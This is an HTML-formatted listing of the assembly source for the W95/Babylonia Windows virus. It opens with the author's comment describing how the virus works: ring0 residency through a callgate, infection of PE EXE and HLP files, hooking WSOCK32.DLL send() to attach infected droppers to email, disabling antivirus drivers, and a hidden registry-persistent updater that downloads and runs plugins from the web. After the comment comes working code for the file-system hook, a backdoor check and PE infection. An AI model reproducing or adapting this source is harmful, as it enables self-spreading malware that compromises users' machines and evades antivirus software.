<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>BABYLON.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment ^</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; W95/Babylonia.11036 - Set babylonia on fire!</span><span class="sc0">
</span><span class="sc1">; (c) Vecna 1999</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; I am of the opinion that asm talk by itself to the worthwhile reader, so, i</span><span class="sc0">
</span><span class="sc1">; will be brief...</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; This virus is a memory resident ring0/ring3 virus, infecting PE EXE files,</span><span class="sc0">
</span><span class="sc1">; HLP files, and WSOCK32.DLL. The virus use EPO features, but no encryption or</span><span class="sc0">
</span><span class="sc1">; poly at all, altought it can be updated via WWW. ;)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; For much time, peoples where thinking about a virus upgradeable. Some attemps</span><span class="sc0">
</span><span class="sc1">; where made, as W95/SK, that was able to run special preparated data in RAR</span><span class="sc0">
</span><span class="sc1">; files. But how far the upgrade RAR packet can go? In this virus, i show my</span><span class="sc0">
</span><span class="sc1">; implementation of a plugin format, with the modules(plug-ins) online at a</span><span class="sc0">
</span><span class="sc1">; a WWW page.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The virus is also a advanced email worm, attaching itself to all outgoing</span><span class="sc0">
</span><span class="sc1">; e-mails(no sending a new one as happy99), can deal with attachments already</span><span class="sc0">
</span><span class="sc1">; in e-mail body, have BASE64 and uu-encode routines, and, more important, the</span><span class="sc0">
</span><span class="sc1">; icon of the infected dropper sended by email change with the current date.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; When a infected app(or dropper) is executed, the virus dont get control at</span><span class="sc0">
</span><span class="sc1">; this moment. The virus patch a JMP or CALL, and wait be called. When this</span><span class="sc0">
</span><span class="sc1">; happen, the virus load some APIs from KERNEL32.DLL memory image(using CRC32),</span><span class="sc0">
</span><span class="sc1">; then jump to ring0 using a callgate. The infamous DESCRIPTOR 0 is used to</span><span class="sc0">
</span><span class="sc1">; store the temporary data, breaking the pmode tabu ;)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; While in ring0, the virus alloc some memory, and install a hook in IFS handler</span><span class="sc0">
</span><span class="sc1">; and wait for access to PE EXE files, HLP files, and WSOCK32.DLL. The memory</span><span class="sc0">
</span><span class="sc1">; is also scanned for presence of SPIDER.VXD(DrWeb) and AVP.VXD(Z0MBiE's lib).</span><span class="sc0">
</span><span class="sc1">; If they're found, their code is patched in a way that it lose the ability of</span><span class="sc0">
</span><span class="sc1">; open files. After returning control to the host, if the virus has just</span><span class="sc0">
</span><span class="sc1">; installed memory resident, it drop the www updater to disk and spawn it.</span><span class="sc0">
</span><span class="sc1">; More about the www updater below.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; PE files when accessed are infected by having the virus appended to last</span><span class="sc0">
</span><span class="sc1">; section, or overwrited if is was relocs, and with the CODE sections scanned</span><span class="sc0">
</span><span class="sc1">; for a suitable place for a CALL VIRUS. HLP files have added a script that pass</span><span class="sc0">
</span><span class="sc1">; control immediatly to virus code by using the callback features of the API of</span><span class="sc0">
</span><span class="sc1">; USER32 EnumWindows().</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; When WSOCK32.DLL is accessed, the send() export is redirected to a chunk of</span><span class="sc0">
</span><span class="sc1">; code in top of relocation info. This code get a ring0 memory pointer to the</span><span class="sc0">
</span><span class="sc1">; new send() handler, by new added functionality to the GetFileAttibute() API ;)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The code in new send() scan the outgoing data by e-mail info, and add a</span><span class="sc0">
</span><span class="sc1">; infected dropper at the end of it. The virus support both MIME and non-MIME</span><span class="sc0">
</span><span class="sc1">; email clients, and can add the dropper in both uu-encoded and BASE64 format.</span><span class="sc0">
</span><span class="sc1">; The icon of this dropper change together with the name, to reflect some dates.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; All data carried with the virus is compressed using aPLib v0.22b library. I</span><span class="sc0">
</span><span class="sc1">; change my old LZW scheme by this routines due the immense gain in speed,</span><span class="sc0">
</span><span class="sc1">; compressed size, and code size. Is the same algorithm i used in Fabi.9608.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; When the www updater is executed, it register itself, with the fake name of</span><span class="sc0">
</span><span class="sc1">; KERNEL32.EXE, in registry, to run always, and copy itself to /winsys directory</span><span class="sc0">
</span><span class="sc1">; to avoid easy detection. The updater hide himself in the CTRL+ALT+DEL task</span><span class="sc0">
</span><span class="sc1">; list, and stay in background waiting for the user connect to the internet.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Always in background, without any user notice, the www updater then connect</span><span class="sc0">
</span><span class="sc1">; to my www page, download the virus plug-ins(that have a special format, and</span><span class="sc0">
</span><span class="sc1">; can be expanded, to have full compatibility with future versions). If these</span><span class="sc0">
</span><span class="sc1">; modules complain with the version and features requeried to run, it is</span><span class="sc0">
</span><span class="sc1">; executed. The power of this is obvious. By adding new plugins, i can make the</span><span class="sc0">
</span><span class="sc1">; virus a irc-worm, infect remote drives, or even a poly engine. The problem of</span><span class="sc0">
</span><span class="sc1">; the possible take down of my URL is bypassed with the smart use of forwarders</span><span class="sc0">
</span><span class="sc1">; (not implemented in the public source version of the updater).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The first module online are the greetz to the peoples that helped me in this</span><span class="sc0">
</span><span class="sc1">; virus, be with betatesting, be with ideas, be with moral support. Currently</span><span class="sc0">
</span><span class="sc1">; i am working in new modules, with new ideas that i think will be worth of be</span><span class="sc0">
</span><span class="sc1">; coded.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; If you arent a d0rk, you can contact me at vecna_br@hotmail.com, but idiot</span><span class="sc0">
</span><span class="sc1">; questions about how compile and like will be ignored... and your soul can be</span><span class="sc0">
</span><span class="sc1">; lost in the attempt of contact me ;)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Questions about where's the entrypoint will be ignored too... ;&gt;</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ^</span><span class="sc0">

</span><span class="sc2">.586p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0">

       </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0">
       </span><span class="sc5">by</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">
       </span><span class="sc5">wo</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">
       </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">
       </span><span class="sc5">fwo</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">fword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">

       </span><span class="sc5">TRUE</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc5">FALSE</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">host.inc</span><span class="sc0">

</span><span class="sc5">_VIRUS</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'KMARAI'</span><span class="sc0">

</span><span class="sc5">vcode</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">DEBUG</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">                           </span><span class="sc1">;debug version?</span><span class="sc0">

</span><span class="sc5">DROPPER_SIZE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">6144</span><span class="sc0">

</span><span class="sc5">ENTRY_READ</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0">
</span><span class="sc5">SKIP_FIRST</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">CRLF</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">CRC_POLY</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0EDB88320h</span><span class="sc0">
</span><span class="sc5">CRC_INIT</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">

</span><span class="sc5">crc</span><span class="sc0">    </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">string</span><span class="sc0">                          </span><span class="sc1">;jp/lapse macro</span><span class="sc0">
</span><span class="sc9">.radix</span><span class="sc0"> </span><span class="sc2">16d</span><span class="sc0">
       </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">CRC_INIT</span><span class="sc0">
       </span><span class="sc9">irpc</span><span class="sc0"> </span><span class="sc5">_x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">string</span><span class="sc4">&gt;</span><span class="sc0">
         </span><span class="sc5">ctrlByte</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc12">'&amp;_x&amp;'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0ff</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
         </span><span class="sc9">rept</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
           </span><span class="sc5">ctrlByte</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ctrlByte</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">CRC_POLY</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ctrlByte</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">))</span><span class="sc0">
         </span><span class="sc9">endm</span><span class="sc0">
         </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc5">ctrlByte</span><span class="sc0">
       </span><span class="sc9">endm</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">crcReg</span><span class="sc0">
</span><span class="sc9">.radix</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">_gdt</span><span class="sc0">   </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">limit</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">base</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_gdt</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">_descriptor</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">limit_l</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">base_l</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">base_m</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">access</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">limit_h</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">base_h</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_descriptor</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">_jmpfar</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">jmpofs32</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">selectr</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_jmpfar</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">_callback</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">offset_l</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">selector</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">attrib</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">offset_h</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_callback</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">wsize2</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">

</span><span class="sc5">hook</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">
  </span><span class="sc5">i_jmp</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                   </span><span class="sc1">;HLP redirector</span><span class="sc0">
</span><span class="sc5">hlp_start</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">virusmain</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc0">
       </span><span class="sc6">enter</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;setup stack frame</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">33</span><span class="sc0">                              </span><span class="sc1">;hookz ifs_attr</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@jmpcc</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc0">                              </span><span class="sc1">;hookz ifs_open</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@jmpcc</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">37</span><span class="sc0">                              </span><span class="sc1">;hookz ifs_ren</span><span class="sc0">
  </span><span class="sc5">@@jmpcc</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc5">jmpcc</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@noopen</span><span class="sc0">                            </span><span class="sc1">;beware! near form of jnz</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">jmpcc</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">0e990h</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">wsize2</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@nodrive</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc3">":@"</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
  </span><span class="sc5">@@nodrive</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">;BCS_WANSI</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">400041h</span><span class="sc0">                            </span><span class="sc1">;VxDCall UniToBCSPath</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vxd</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;edi=start of name</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'---.'</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@no_special</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc13">'_\'
</span><span class="sc0">       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@no_special</span><span class="sc0">                        </span><span class="sc1">;trying to access the backdoor?</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">33</span><span class="sc0">                   </span><span class="sc1">;file attr?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@no_special</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">backdoor</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0"> </span><span class="sc1">;wsock32.dll is calling us</span><span class="sc0">
  </span><span class="sc5">@@no_special</span><span class="sc4">:</span><span class="sc0">

     </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'TAOG'</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@shit</span><span class="sc0">
     </span><span class="sc9">ENDIF</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">                     </span><span class="sc1">;esi=extension</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@try_hlp</span><span class="sc0">

</span><span class="sc5">doshdr</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">peptr</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc0">
</span><span class="sc5">pehdr</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">doshdr</span><span class="sc4">+</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc5">cbfr</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">pehdr</span><span class="sc4">+</span><span class="sc2">0f8h</span><span class="sc0">
</span><span class="sc5">sectn</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">cbfr</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">fsize</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">sectn</span><span class="sc4">+</span><span class="sc2">200h</span><span class="sc0">
</span><span class="sc5">epraw</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">fsize</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">vrva</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">epraw</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">lolimit</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">vrva</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">uplimit</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">lolimit</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">wsize4</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">uplimit</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">wsize4</span><span class="sc0">                        </span><span class="sc1">;infect PE EXE files...</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">open</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@err</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getsize</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">fsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DROPPER_SIZE</span><span class="sc0">                   </span><span class="sc1">;my babies get better treatment</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@dropper</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check_size</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@err1</span><span class="sc0">
  </span><span class="sc5">@@dropper</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
